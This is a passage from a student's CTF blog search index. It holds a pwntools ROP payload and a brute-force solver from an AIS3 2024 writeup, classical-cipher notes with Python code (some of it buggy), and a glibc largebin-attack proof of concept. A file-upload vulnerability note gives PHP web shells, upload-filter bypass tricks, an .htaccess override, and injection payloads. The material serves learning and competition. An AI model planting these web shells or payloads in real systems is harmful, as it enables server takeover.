rop = flat( pop_rdi_ret, 0xCAFEBABE, win_addr ) payload = b\u0026#34;aaaa\u0026#34; + pack(rbp_addr, 64) + rop print(r.sendlineafter(b\u0026#34;Enter an operation and two numbers (e.g., 1 + 1) :\u0026#34;, b\u0026#34;q\u0026#34;).decode()) print(r.sendlineafter(b\u0026#34;Are you sure you want to leave? [Y/n]\u0026#34;,payload).decode()) r.interactive() 可以得到flag的前後段\nREV #\rThe Long Print #\rdecompile後會sleep 0x3674 秒\n可以先設斷點 在跑到斷點的時候可以編輯Assemble 把數字改成0 刪除的斷點，在printf後設斷點， 慢慢的按continue就可以一個字一個字的得到flag\n火拳のエース #\r從decompile後的偽c代碼，可以得知祕密的字串長度是24\n並將字串拆成4段，並對其進行xor運算和複雜運算\nxor的key\n只要把byte提出來爆搜就可以得到flag(後段)了，前段可以在.rodata找到\n解法\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026#34;defs.h\u0026#34; void xor_strings(char str[], char key[]) { for (int i = 0; i \u0026lt;= 7; ++i) { str[i] ^= key[i]; } } int complex_function(int a1, int a2) { int v2; // eax int v4; // [esp+8h] [ebp-10h] int v5; // [esp+Ch] [ebp-Ch] if (a1 \u0026lt;= 64 || a1 \u0026gt; 90) { puts(\u0026#34;It feels slightly wrong, but almost correct...\u0026#34;); exit(1); } v5 = (17 * a2 + a1 - 65) % 26; v4 = a2 % 3 + 3; v2 = a2 % 3; if (a2 % 3 == 2) { v5 = (v5 - v4 + 26) % 26; } else if (v2 \u0026lt;= 2) { if (v2) { if (v2 == 1) v5 = (2 * v4 + v5) % 26; } else { v5 = (v4 * v5 + 7) % 26; } } return v5 + 65; } int main() { char buf[32] = \u0026#34;AAAAAAAA\u0026#34;; char ans[32] = \u0026#34;DHLIYJEGMZRERYNDRUYODBAHBKEMPBRE\u0026#34;; char key[32] = { 0x0E, 0x0D, 0x7D, 0x06, 0x0F, 0x17, 0x76, 0x04, 0x6D, 0x00, 0x1B, 0x7C, 0x6C, 0x13, 0x62, 0x11, 0x1E, 0x7E, 0x06, 0x13, 0x07, 0x66, 0x0E, 0x71, 0x17, 0x14, 0x1D, 0x70, 0x79, 0x67, 0x74, 0x33, }; for (int k = 0; k \u0026lt; 4; k++) { for (int i = 0; i \u0026lt; 8; i++) { for (int j = 0; j \u0026lt; 256; j++) { int try_n = j ^ key[i + k * 8]; char a; if (try_n \u0026gt;= 65 \u0026amp;\u0026amp; try_n \u0026lt;= 90) a = complex_function(try_n, i + k * 32); else continue; if (a == ans[i + k * 8]) { printf(\u0026#34;%c\u0026#34;, j); break; } } } } } ","date":"2024-06-01","externalUrl":null,"permalink":"/writeups/ais3-pre-exam/","section":"Writeups","summary":"前言 #\r先不說是不是用運氣打的(那題pwn是我半夜夢到解法起床解的)","title":"AIS3 pre-exam 2024 writeup","type":"writeups"},{"content":"\rwhoami #\r我在社群上用的名字是 Dr.dog，目前高二\n常打 ctf，主要玩 reverse 和 crypto，pwn 也有練過一陣子\nHow to find me #\r有事可以在 dc 找到我，id:hokak_，加好友之前稍微自我介紹一下就 ok 了\n比較正式的事可以找我 email(頭像下方)\nBlog #\r建立 blog 的契機是因為懶得自我介紹\n痾我需要一個 blog 來放筆記、Writeup\n比賽的時候 copy 自己的起來比較快\n網站架構是用 Hugo \u0026amp; Blowfish\n喔對，背景都是來自蒼之彼方四重奏，蠻推這遊戲的\nExperiences #\rCTF experiences #\rCTF (solo) #\r2024 ACSC CTF 2024 hokak 152 2024 CSAW'24 CTF hokak 193/1184 2024 DEADFACE CTF 2024 hok4lc 118/1215 2024 niteCTF 2024 hok4lc 93/1174 2025 Srdnlen CTF 2025 hok4lc 101/1154 2025 squ1rrel CTF hok4lc 105/603 CTF (with ICEDTEA) #\r2024 Imaginary CTF ICEDTEA 61/1457 2024 PatriotCTF 2024 ICEDTEA 33/1360 2024 Iron CTF 2024 ICEDTEA 121/1033 2024 sunshine CTF ICEDTEA 61/642 2025 IrisCTF 2025 ICEDTEA 40/1064 2025 x3ctf 2025 ICEDTEA 27/528 2025 Nullcon Goa HackIM 2025 CTF ICEDTEA 53/1115 2025 SwampCTF 2025 ICEDTEA 61/751 CTF (other) #\r2025 picoCTF 2025 Remote Computer Explosion 51/10460 國內 #\r2024 THJCC 臺灣高中聯合資安競賽 THJCC_hokak 2 2024 AIS3 pre-exam hokak 42 2024 Scist 4th final CTF SCIST_18 1 2024 CGGC 網路守護者挑戰賽 初賽 金爐香盡漏聲殘，我只剩下半顆肝 7 2024 CGGC 網路守護者挑戰賽 決賽 金爐香盡漏聲殘，我只剩下半顆肝 6 Competitve Programming #\r2023 APCS 3/3 2024 APCS 4/4 2024 HSPC 決賽 Activities #\r2023 SCIST 4th 學員 2024 TFcis 網管組，資安教學(? 2024 臺南一中國中生程式設計營 基礎班講師 2024 ICEDTEA(實中資安) 戰隊成員 2024 AIS3 學員 2024 B33F 50μP(成大資安社) 戰隊成員 2024 臺灣好厲駭 9th 學員 2024 THJCC 2024 winter 出題者 ","date":"2007-10-18","externalUrl":null,"permalink":"/about/","section":"Homepage","summary":"whoami #\r我在社群上用的名字是 Dr.","title":"About","type":"page"},{"content":"","externalUrl":null,"permalink":"/notes/algo/","section":"Notes","summary":"","title":"Algo","type":"notes"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rIntro #\r因為不想一直通靈所以打算做一篇古典密碼的筆記\n古典密碼通常會使用替換式或移項式的加密方式\n容易被頻率分析或暴力搜索破解\nSubstitution Cipher(替換式密碼) #\r字母位置不變，但透過以一個字母到兩個字母為一組，進行加密\nCasear Cipher(凱薩密碼) #\r加密 #\r會把每個字母同時位移\n比如說若KEY = 1\nABCDE -\u0026gt; BCDEF\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 13 密文 GUR DHVPX OEBJA SBK WHZCF BIRE GUR YNML QBT 解密 #\r反過來做就好了，這種加密方式很容易爆破\n實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, key:int)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext: if ch.upper() in alphabet: pos = alphabet.index(ch.upper()) ch = alphabet[(pos + key) % 26] cipher += ch return cipher def decrypt(cipher:str, key:int)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; for ch in cipher: if ch.upper() in alphabet: pos = alphabet.index(ch.upper()) ch = alphabet[(pos + key) % 26] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 13) plaintext = decrypt(cipher, 13) print(cipher) print(plaintext) Vigenère Cipher(維吉尼亞密碼) #\r明文和都是字串，密鑰是循環的\n加密 #\r把密鑰的單個字元當作offset，A=0,B=1,C=2,etc.\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 ABCD 密文 TIG TUJEN BSQZN GQA JVOSS PXHR UJH LBBB DPI 解密 #\r反過來做就好了\n密碼破譯，工具:\n卡西斯基試驗:當相同的字母序列在密文中重複出現，中間的間隔可能是密鑰長度 弗里德曼試驗:密文中的字母會出現不同頻率，可以通過計算密文的重合指數，來獲得密鑰長度 重和指數:\n$$ \\kappa_{o} = \\frac{\\sum_{i=1}^{c}n_{i}(n_{i}-1)}{N(N-1)} $$\n$c$:字母表的長度（英文為26）\n$N$:指文本的長度\n$n_1$~$n_c$:密文的字母頻率，為整數\n密鑰長度約為: $${\\kappa _{p}-\\kappa _{r}} \\over {\\kappa _{o}-\\kappa _{r}}$$ ${\\kappa _{p}}$:兩個任意字母相同的概率\n${\\kappa _{r}}$:字母表中這種情況出現的概率（英文中為1/26=0.0385)\n頻率分析，一旦確定密鑰長度，可以把密文分成和密鑰長度相等的列數，一列相等於一組凱薩密碼，透過頻率分析可以獲得明文 實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, key:int)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext.upper(): if ch.isalpha(): pos = alphabet.index(ch) ch = alphabet[(pos + key) % 26] cipher += ch return cipher def decrypt(cipher:str, key:int)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; for ch in cipher.upped(): if ch.isalpha(): pos = alphabet.index(ch) ch = alphabet[(pos + key) % 26] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 13) plaintext = decrypt(cipher, 13) print(cipher) print(plaintext) Simple Substitution Cipher(簡易替換密碼) #\r又稱Monoalphabetic Cipher(單表加密)\n用一張改變順序後的字母表，並以該字母表書寫\n即可稱為簡易替換密碼，像是凱薩加密、仿射加密都算\n加密 #\r把明文的每個字母替換成對照表對應的字母\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 GHAWQYKIJBXSTUVFOPCDRNMEZL 密文 DIQ ORJAX HPVMU YVE BRTFC VNQP DIQ SGLZ WVK 解密 #\r反過來做就好了，也可以使用quip qiup爆破\n實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, key:str)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext.upper(): if ch.isalpha(): pos = alphabet.index(ch) ch = key[pos] cipher += ch return cipher def decrypt(cipher:str, key:str)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; for ch in cipher.upper(): if ch.isalpha(): pos = key.index(ch) ch = alphabet[pos] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: key = \u0026#39;GHAWQYKIJBXSTUVFOPCDRNMEZL\u0026#39; cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, key) plaintext = decrypt(cipher, key) print(cipher) print(plaintext) Affine Cipher(仿射密碼) #\r加密 #\r$$ a,m互質 $$ $$ E(x)=ax+b{\\pmod {m}} $$\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 a=15, b=3 密文 CEL JRTHX SYFVQ AFK IRBUN FGLY CEL MDOZ WFP 證明加密的可行性: $E(x)$為單射函數 $$ E(x_1) = E(x_2) $$ $$ ax_1+b \\equiv ax_2+b{\\pmod {m}} $$ $$ ax_1 \\equiv ax_2{\\pmod {m}} $$ $$ x_1 \\equiv x_2{\\pmod {m}} $$ $$ x_1 = x_2(不超過字母表範圍) $$\n解密 #\r$$ D(x)=a^{-1}(x-b){\\pmod {m}}$$ $$ a^{-1} 為a對m之模倒數，\\text{python中可以使用pow(a,-1,m)計算} $$\n解密原理: $$ D(x)=a^{-1}(E(x)-b){\\pmod {m}}$$ $$ D(x)=a^{-1}(ax+b-b){\\pmod {m}}$$ $$ D(x)=a^{-1}a^{1}x{\\pmod {m}}$$ $$ D(x)=x{\\pmod {m}}$$\n也可以使用quip qiup爆破\n實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, a:int, b:int)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext: if ch.isalpha(): pos = alphabet.index(ch.upper()) ch = alphabet[(pos * a + b) % 26] cipher += ch return cipher def decrypt(cipher:str, a:int, b:int)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; inv = pow(a, -1, 26) for ch in cipher: if ch.isalpha(): pos = alphabet.index(ch.upper()) ch = alphabet[(pos - b) * inv % 26] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 15, 3) plaintext = decrypt(cipher, 15, 3) print(cipher) print(plaintext) Playfair Cipher #\r加密 #\r密鑰產生\n選取一個英文字作密鑰 除去重覆出現的字母 將密鑰的字母逐個逐個加入5×5的矩陣內，剩下的空間將未加入的英文字母依a-z的順序加入（將Q去除，或將I和J視作同一字） 假設密鑰為PLAYFAIR EXAMPLE\n預處理\n將每兩個字母分成一組，若是同組字母一樣，在兩字母之間插入X或Q，重新分組，若剩下一個字，在尾端補上X\nHide the gold in the tree stump -\u0026gt;HI DE TH EG OL DI NT HE TR EX ES TU MP\n加密\n找出組中兩個字母的位置\n字母不同行不同列，取對角的字元\n字母同行，取兩字母右方之字元\n字母同列，取兩字母下方之字元\n項目 值 明文 HIDE THE GOLD IN THE TREE STUMP 密鑰 PLAYFAIR EXAMPLE 密文 BM OD ZB XD NA BE KU DM UI XM MO UV IF 解密 #\r將加密過程反過來操作即可，但字元會因為經過預處理過的關係，導致和明文有所偏差\n實作 #\rdef gen_key(key:int): key = key.replace(\u0026#39;J\u0026#39;, \u0026#39;I\u0026#39;) matrix = [] used = set() for ch in key.upper(): if ch not in used and ch.isalpha(): matrix.append(ch) used.add(ch) for ch in \u0026#34;ABCDEFGHIKLMNOPQRSTUVWXYZ\u0026#34;: if ch not in used: matrix.append(ch) used.add(ch) return [matrix[i:i+5] for i in range(0, 25, 5)] def find_position(matrix:list, ch:str): for y in range(5): for x in range(5): if matrix[y][x] == ch: return y, x return None def preprocess_text(text:str): text = text.replace(\u0026#39;J\u0026#39;, \u0026#39;I\u0026#39;).upper().replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;) processed = \u0026#34;\u0026#34; i = 0 while i \u0026lt; len(text): ch = text[i] ch2 = text[i+1] if i+1 \u0026lt; len(text) else \u0026#39;X\u0026#39; if ch == ch2: processed += ch processed += \u0026#39;X\u0026#39; i += 1 else: processed += ch processed += ch2 i += 2 return processed def encrypt(plaintext:str, key:str): matrix = gen_key(key) plaintext = preprocess_text(plaintext) cipher = [] for i in range(0, len(plaintext), 2): ch1, ch2 = plaintext[i], plaintext[i+1] y1, x1 = find_position(matrix, ch1) y2, x2 = find_position(matrix, ch2) if y1 == y2: cipher += matrix[y1][(x1 + 1) % 5] cipher += matrix[y2][(x2 + 1) % 5] elif x1 == x2: cipher += matrix[(y1 + 1) % 5][x1] cipher += matrix[(y2 + 1) % 5][x2] else: cipher += matrix[y1][x2] cipher += matrix[y2][x1] return \u0026#39;\u0026#39;.join(cipher) def decrypt(cipher, key): matrix = gen_key(key) plaintext = [] for i in range(0, len(cipher), 2): y1, x1 = find_position(matrix, cipher[i]) y2, x2 = find_position(matrix, cipher[i+1]) if y1 == y2: plaintext.append(matrix[y1][(x1 - 1) % 5]) plaintext.append(matrix[y2][(x2 - 1) % 5]) elif x1 == x2: plaintext.append(matrix[(y1 - 1) % 5][x1]) plaintext.append(matrix[(y2 - 1) % 5][x2]) else: plaintext.append(matrix[y1][x2]) plaintext.append(matrix[y2][x1]) return \u0026#39;\u0026#39;.join(plaintext) if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, \u0026#39;PLAYFAIR EXAMPLE\u0026#39;) plaintext = decrypt(cipher, \u0026#39;PLAYFAIR EXAMPLE\u0026#39;) print(cipher) print(plaintext) Transposition Cipher(替換式加密) #\r字母不變，依某個順序替換每個字母的位置\nScytale Cipher(密碼棒) #\r加密 #\r把字條綁在指定寬度的木棒上，並橫著書寫文字\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 5 密文 TUB J LDHIRFUOTAOECOOMVHZG KWXPEEY Q N SR 解密 #\r把紙條綁在指定寬度的木棒上，橫著閱讀文字，很容易爆破\n實作 #\rdef encrypt(plaintext, key): plaintext += \u0026#39; \u0026#39; * (-len(plaintext) % key) cipher = [\u0026#39;\u0026#39;] * key for i, ch in enumerate(plaintext): cipher[i % key] += ch return \u0026#39;\u0026#39;.join(cipher) def decrypt(cipher, key): cipher += \u0026#39; \u0026#39; * (-len(cipher) % key) row = len(cipher) // key plaintext = [\u0026#39;\u0026#39;] * row for i, ch in enumerate(cipher): plaintext[i % row] += ch return \u0026#39;\u0026#39;.join(plaintext) if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 5) plaintext = decrypt(cipher, 5) print(cipher.encode()) print(plaintext) Railfence Cipher #\r加密 #\r如上圖，把文字依這種格式排列\n並橫著書寫文字\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 5 密文 TKFSHDHC OP TE OEIBNXMO YG URW UVRLZQOJEA 解密 #\r推算回書寫的格式，並依照上圖順序閱讀，很容易爆破\n實作 #\rdef encrypt(plaintext:str, key:int)-\u0026gt;str: rails = [\u0026#39;\u0026#39;] * key rail = 0 dir = 1 for char in plaintext: rails[rail] += char if rail == 0: dir = 1 elif rail == key - 1: dir = -1 rail += dir return \u0026#39;\u0026#39;.join(rails) def decrypt(ciphertext:str, key:int): rails = [[] for _ in range(key)] rail_len = [0] * key rail = 0 dir = 1 for i in range(len(ciphertext)): rail_len[rail] += 1 if rail == 0: dir = 1 elif rail == key - 1: dir = -1 rail += dir idx = 0 for i in range(key): rails[i] = list(ciphertext[idx:idx + rail_len[i]]) idx += rail_len[i] decrypted_text = [] rail = 0 dir = 1 for i in range(len(ciphertext)): decrypted_text.append(rails[rail].pop(0)) if rail == 0: dir = 1 elif rail == key - 1: dir = -1 rail += dir return \u0026#39;\u0026#39;.join(decrypted_text) if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 5) plaintext = decrypt(cipher, 5) print(cipher) print(plaintext) Route Cipher #\r加密 #\r將明文再給定尺寸的網格寫下，在依照特定的路徑讀取字母\n項目 值 明文 WE ARE DISCOVERED FLEE AT ONCE 密鑰 「從右上角開始，順時針向內螺旋讀取」 密文 EJXCTEDEC DAEWRIORF EONALEVSE 解密 #\r依照密鑰的指令，反方向寫回給定尺寸的網格\n","externalUrl":null,"permalink":"/notes/crypto/classical-cipher/","section":"Notes","summary":"Intro #\r因為不想一直通靈所以打算做一篇古典密碼的筆記","title":"Classical Cipher","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/crypto/","section":"Notes","summary":"","title":"Crypto","type":"notes"},{"content":"文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話\n伺服器如何處理靜態檔案的Request #\r檔案路徑 #\r傳統的網站會把檔案的request，1:1的映射到自己的檔案路徑，如：\nGET /files/avatars/profile.png HTTP/1.1 profile.png 的絕對位置可能為/var/www/html/files/avatars/profile.png\n回傳的檔案內容 #\r如果檔案類型為non-executable：伺服器會回傳檔案的內容 如果檔案類型為excutable：伺服器會把request的header和parameter指派給對應的變數，並回傳執行的結果輸出 如果檔案類型為excutable，但伺服器沒有設定要執行：大部分情況下會回傳error，但少部分情況會回傳檔案內容回來 Web Shell #\r如果使用者可以執行上傳的檔案，那麼這些檔案內容會造成危害\n任意讀取檔案 #\r\u0026lt;?php echo file_get_contents(\u0026#39;/path/to/target/file\u0026#39;); ?\u0026gt; 執行指令 #\r\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 用這樣的方式可以傳遞parameter給web shell：\nGET /example.com/exploit.php?command=id HTTP/1.1 Bypassing #\rContent-Type #\r若是伺服器使用Content-Type驗證檔案\nPOST /images HTTP/1.1\rHost: example.com\rContent-Length: 12345\rContent-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456\r---------------------------012345678901234567890123456\rContent-Disposition: form-data; name=\u0026#34;image\u0026#34;; filename=\u0026#34;exploit.php\u0026#34;\rContent-Type: image/png\r\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\r---------------------------012345678901234567890123456\rContent-Disposition: form-data; name=\u0026#34;username\u0026#34;\ruser\r---------------------------012345678901234567890123456-- 將Content-Type改成image/png或其他\nmagic number #\r伺服器驗證檔案的header\n利用exiftool:\nexiftool -Comment=\u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34; img.jpg 利用linux:\necho \u0026#39;\u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#39; \u0026gt;\u0026gt; img.png 副檔名驗證 #\r如果遇到副檔名被擋的情況\n使用其他副檔名 #\r以下副檔名之檔案為executable\nPHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm Flash: .swf Perl: .pl, .cgi Erlang Yaws Web Server: .yaws 更改大小寫 #\rexploit.pHP\n在增加更多副檔名層級 #\rexploit.png.php exploit.php.png exploit.php%00.png%00.jpg\n副檔名尾端加入特殊字元 #\rexploit.php%20 exploit.php%0a exploit.php%00 exploit.php%0d%0a exploit.php/ exploit.php.\\ exploit. exploit.php.... exploit.pHp5.... 混淆副檔名parser #\r使用多個副檔名、特殊字元和填充多個null byte混淆副檔名parser\nexploit.png.php exploit.png.pHp5 exploit.php#.png exploit.php%00.png exploit.php\\x00.png exploit.php%0a.png exploit.php%0d%0a.png exploit.phpJunk123png 突破檔案名稱長度上限 #\rpython -c 'print \u0026quot;A\u0026quot; * 232' + .php.jpg\n繞過反繞過 #\rexploit.p.phphp\nOverriding The Server Configuration #\rApache #\r檢查/etc/apache2/apache2.conf(或httpd.conf)，確保server有允許使用.htaccess: \u0026lt;Directory /path/to/your/directory\u0026gt;\rAllowOverride All\r\u0026lt;/Directory\u0026gt; 上傳.htaccess於目前資料夾:\nAddType application/x-httpd-php evil\n上傳expoilt.evil，理論上會被當作php執行\nFilename Tricks #\rpath travelsal #\r伺服器解析後檔案可能上傳於上層目錄\n..%2Fexploit.php\nSQL injection #\r此payload可以暫停延遲10秒的sql\nsleep(10)-- -.jpg\ncommand injection #\r; sleep 10;\nXSS #\r\u0026lt;svg onload=alert(1)\u0026gt;\nReference #\rHackTricks Port Swigger ","externalUrl":null,"permalink":"/notes/web/file-upload-vulnerbility/","section":"Notes","summary":"文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話","title":"File Upload Vulnerability","type":"notes"},{"content":" 版本 latest 效果 使目標被修改為某個chunk unsortedbin放chunk回largebin的情況 #\r如果size為比bin鍊最後一塊(同時也是最小塊)還小，就直接插入尾端 #\rif ((unsigned long)(size) \u0026lt; (unsigned long)chunksize_nomask(bck-\u0026gt;bk)) { fwd = bck; bck = bck-\u0026gt;bk; victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } 主要攻擊點 #\rfwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; 達成以下條件，就能使target被寫入victim:\n我們可以控制victim-\u0026gt;bk_nextsize為target - 0x20 接下來放入的chunk是比該bin鍊的所有chunk還小 exploit #\r完整腳本 #\r#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;assert.h\u0026gt; int main(){ /*Disable IO buffering to prevent stream from interfering with heap*/ setvbuf(stdin,NULL,_IONBF,0); setvbuf(stdout,NULL,_IONBF,0); setvbuf(stderr,NULL,_IONBF,0); size_t target = 0xdeadbeef; size_t *p1 = malloc(0x428); size_t *g1 = malloc(0x18); size_t *p2 = malloc(0x418); size_t *g2 = malloc(0x18); free(p1); size_t *g3 = malloc(0x438); free(p2); p1[3] = (size_t)((\u0026amp;target)-4); size_t *g4 = malloc(0x438); printf(\u0026#34;Target (%p) : %p\\n\u0026#34;,\u0026amp;target,(size_t*)target); assert((size_t)(p2-2) == target); return 0; } 先宣告兩個大chunk #\rint main(){ /*Disable IO buffering to prevent stream from interfering with heap*/ setvbuf(stdin,NULL,_IONBF,0); setvbuf(stdout,NULL,_IONBF,0); setvbuf(stderr,NULL,_IONBF,0); size_t target = 0xdeadbeef; size_t *p1 = malloc(0x428); size_t *g1 = malloc(0x18); size_t *p2 = malloc(0x418); size_t *g2 = malloc(0x18); 把其中一個丟進largebin #\rfree(p1); size_t *g3 = malloc(0x438); 現在第二個chunk在unsortedbin #\rfree(p2); 修改第一個chunk的bk_nextsize #\rp1[3] = (size_t)((\u0026amp;target)-4); 把第二個chunk從unsortedbin丟回largebin #\rsize_t *g4 = malloc(0x438); ","externalUrl":null,"permalink":"/notes/pwn/heap/12-largebin_attack/","section":"Notes","summary":"版本 latest 效果 使目標被修改為某個chunk unsortedbin放chunk回largebin的情況 #\r如果size為比bin鍊最後一塊(同時也是最小塊)還小，就直接插入尾端 #\rif ((unsigned long)(size) \u0026lt; (unsigned long)chunksize_nomask(bck-\u0026gt;bk)) { fwd = bck; bck = bck-\u0026gt;bk; victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } 主要攻擊點 #\rfwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; 達成以下條件，就能使target被寫入victim:","title":"Largebin Attack","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/misc/","section":"Notes","summary":"","title":"Misc","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/others/","section":"Notes","summary":"","title":"Others","type":"notes"},{"content":"\rHelloWindows.exe #\rmain #\r分析過後可以看到有使用VirtualProtect把一段記憶體改成rwx\n並把一段shellcode複製到上面，並執行他 shellcode_data #\r然後實際跳到shellcode，會看到一堆亂碼 可以使用edit\u0026gt;code把這段data轉成assembly 然後create function\nshellcode #\r實際來分析shellcode 改一改參數的變數類型 %d被存到v6，且在function call的時候v7有使用到取址運算子\u0026amp;\n因此可以猜測a2是scanf\n接下來進入了一的for迴圈，並使用了v6[1]當counter\n然後對data[v6[1]] - v7，再取LOBYTE和fake_flag做xor\nsolution #\r分析過程\n使用者輸入了一個整數 把data[v6[1]] - v7 取最低byte當xor的值 因為是取最低byte，所以可以得知flag的結果只有256種，因此窮舉0~255當key就可以得到flag了\n","externalUrl":null,"permalink":"/notes/reverse/scist-reverse-course-advance/","section":"Notes","summary":"HelloWindows.","title":"PatriotCTF 2024 rustLock upsolve","type":"notes"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/notes/tools/","section":"Notes","summary":"","title":"Tools","type":"notes"},{"content":"","externalUrl":null,"permalink":"/topics/","section":"Topics","summary":"","title":"Topics","type":"topics"},{"content":"","externalUrl":null,"permalink":"/notes/web/","section":"Notes","summary":"","title":"Web","type":"notes"}]